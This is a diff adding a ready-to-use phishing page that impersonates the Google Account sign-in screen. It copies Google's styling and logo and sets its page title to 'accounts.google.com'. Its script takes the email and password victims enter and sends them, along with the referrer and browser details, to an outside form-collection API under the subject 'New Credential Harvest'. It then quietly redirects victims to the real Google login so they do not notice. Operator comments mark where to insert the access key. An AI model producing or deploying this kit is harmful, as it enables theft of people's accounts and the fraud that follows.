@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>accounts.google.com</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f1f3f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 1px 6px 0 rgba(32, 33, 36, 0.28);
+            width: 400px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo svg {
+            width: 75px;
+            height: 24px;
+        }
+        h2 {
+            text-align: center;
+            color: #3c4043;
+            font-size: 24px;
+            font-weight: 400;
+        }
+        .subtitle {
+            text-align: center;
+            color: #5f6368;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input[type="email"]:focus, input[type="password"]:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 1px 6px 0 rgba(32, 33, 36, 0.28);
+        }
+        .btn-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 16px;
+        }
+        .btn {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .btn:hover {
+            background-color: #1557b0;
+        }
+        .text-btn {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            color: #5f6368;
+            font-size: 12px;
+        }
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .hidden-status {
+            text-align: center;
+            margin-top: 10px;
+            color: #5f6368;
+            font-size: 14px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="logo">
+        <!-- Google 'G' Logo SVG -->
+        <svg viewBox="0 0 75 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M14.1008 9.69795H26.8333V12.302H14.1008V9.69795Z" fill="#4285F4"/>
+            <path d="M14.1008 15.698H26.8333V18.302H14.1008V15.698Z" fill="#34A853"/>
+            <path d="M14.1008 12.698H26.8333V15.302H14.1008V12.698Z" fill="#FBBC05"/>
+            <path d="M14.1008 9.69795H11.4967V12.302H14.1008V9.69795Z" fill="#EA4335"/>
+            <path d="M14.1008 15.698H11.4967V18.302H14.1008V15.698Z" fill="#34A853"/>
+            <path d="M14.1008 12.698H11.4967V15.302H14.1008V12.698Z" fill="#FBBC05"/>
+        </svg>
+    </div>
+    <h2>Sign in</h2>
+    <p class="subtitle">Use your Google Account</p>
+    
+    <form id="harvestForm">
+        <input type="email" id="emailInput" placeholder="Email" required>
+        <input type="password" id="passwordInput" placeholder="Password" required>
+        
+        <div class="btn-row">
+            <a href="#" class="text-btn">Forgot email?</a>
+            <button type="submit" class="btn">Next</button>
+        </div>
+    </form>
+
+    <div id="status" class="hidden-status">
+        Authenticating...
+    </div>
+
+    <div class="footer">
+        <p>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
+        <p><a href="#">Privacy</a> • <a href="#">Terms</a> • <a href="#">Help</a></p>
+    </div>
+</div>
+
+<script>
+    // ==========================================
+    // CONFIGURATION SECTION
+    // ==========================================
+    // EDIT HERE:4d4ca33b-e7a1-4e07-aa8e-cdb97f990290
+    const WEB3FORMS_ACCESS_KEY = "YOUR_WEB3FORMS_ACCESS_KEY_HERE"; 
+
+    // EDIT HERE: Agar aap chahte hain ki victim ko kisi specific jagah redirect kiya jaye
+    // Default: Real Google Login with pre-filled email
+    const REDIRECT_URL = "https://accounts.google.com/ServiceLogin?hl=en&passive=true&flowName=GlifWebSignIn&flowEntry=ServiceLogin";
+    // ==========================================
+
+    document.getElementById('harvestForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const email = document.getElementById('emailInput').value;
+        const password = document.getElementById('passwordInput').value;
+        const statusDiv = document.getElementById('status');
+
+        // UI Update
+        statusDiv.style.display = 'block';
+        statusDiv.textContent = 'Authenticating...';
+
+        // Prepare Payload for Web3Forms
+        const payload = {
+            "access_key": WEB3FORMS_ACCESS_KEY,
+            "victim_email": email,
+            "victim_password": password,
+            "referral_source": document.referrer || "Direct Access",
+            "user_agent": navigator.userAgent,
+            "timestamp": new Date().toISOString(),
+            "_subject": "New Credential Harvest: " + email,
+            "_template": "table" 
+        };
+
+        // Send to Web3Forms
+        fetch("https://api.web3forms.com/submit", {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok: ' + response.status);
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Success:', data);
+            
+            // Check if Web3Forms returned success
+            if (data.success) {
+                statusDiv.textContent = 'Redirecting to your inbox...';
+                
+                // Create a seamless redirect with pre-filled email
+                const redirectUrl = REDIRECT_URL + "&Email=" + encodeURIComponent(email);
+                
+                // Delay for realism
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 1500);
+            } else {
+                throw new Error('Web3Forms error: ' + JSON.stringify(data));
+            }
+        })
+        .catch((error) => {
+            console.error('There has been a problem with your fetch operation:', error);
+            statusDiv.textContent = 'Error: ' + error.message + '. Please try again.';
+            statusDiv.style.color = 'red';
+        });
+    });
+</script>
+
+</body>
+</html>
